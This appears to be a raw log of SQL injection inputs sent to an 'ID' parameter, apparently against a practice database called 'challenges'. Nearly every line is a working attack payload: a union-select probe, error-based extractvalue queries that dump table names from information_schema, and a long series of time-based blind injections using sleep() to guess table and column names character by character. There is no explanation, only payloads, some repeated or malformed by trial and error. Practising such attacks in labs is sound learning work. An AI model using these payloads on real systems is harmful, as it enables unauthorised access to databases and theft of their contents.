ID:1
ID:10
ID:-1' union select 1,2,3 -- 
ID:1'
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1') union select 1,2,extractvalue(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ) ,0x7e)) #
ID:1') union select 1,2,extractvalue(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ) ,0x7e)) #
ID:1') union select 1,2,extractvalue(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ) ,0x7e)) #
ID:1') union select 1,2,extractvalue(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ) ,0x7e)) #
ID:1') union select 1,2,extractvalue(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ) ,0x7e)) #
ID:1') and  if(left( (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ,1) = 's' ),sleep(3),0)
ID:1') and  if(left( (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ,1) = 's' ),sleep(3),0)
ID:1') and  if(left( (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ,1) = 's' ),sleep(3),0)
ID:1') and  if(left( (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ,1) = 's' ),sleep(3),0) #
ID:1') and if(left( select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ,1) = 's' ,sleep(3),0) #
ID:1') and if(left( select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ,1) = 's' ,sleep(3),0) #
ID:1') and if( left(database(),1) = 'b' ,sleep(3),0) #
ID:1') and if( left( (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ) ,1) = 'b' ,sleep(3),0) #
ID:1') and if( left( (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ) ,1) = 'b' ,sleep(3),0) #
ID:1') and if( left( (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ) ,1) = 'Y' ,sleep(3),0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = ',') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '-') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '.') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '/') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = ':') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = ';') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '<') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '=') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '>') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '?') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '@') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '[') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '\') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = ']') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '^') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '_') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '`') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '{') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '|') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '}') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '~') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),1) = 'a') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),1) = 'b') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),1) = 'c') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),1) = 'd') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),1) = 'e') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),1) = 'f') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),1) = 'g') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),1) = 'h') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),1) = 'i') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),2) = 'ia') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),2) = 'ib') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),2) = 'ic') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),2) = 'id') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'ida') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'idb') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'idc') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'idd') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'ide') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'idf') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'idg') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'idh') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'idi') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'idj') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'idk') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'idl') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'idm') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'idn') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'ido') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'idp') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'idq') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'idr') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'ids') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'idt') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'idu') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'idv') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'idw') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'idx') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'idy') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'idz') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'idA') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'idB') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'idC') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'idD') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'idE') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'idF') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'idG') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'idH') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'idI') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'idJ') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'idK') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'idL') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'idM') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'idN') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'idO') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'idP') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'idQ') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'idR') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'idS') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'idT') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'idU') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'idV') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'idW') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'idX') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'idY') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'idZ') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'id0') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'id1') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'id2') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'id3') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'id4') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'id5') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'id6') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'id7') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'id8') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'id9') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'id!') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'id"') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'id$') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'id%') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'id&') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'id'') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'id(') , sleep(5) , 0) #
ID:1') and if( (left((select column_name from information_schema.columns where table_name = 'wf227g4abp' limit 0,1),3) = 'id)') , sleep(5) , 0) #
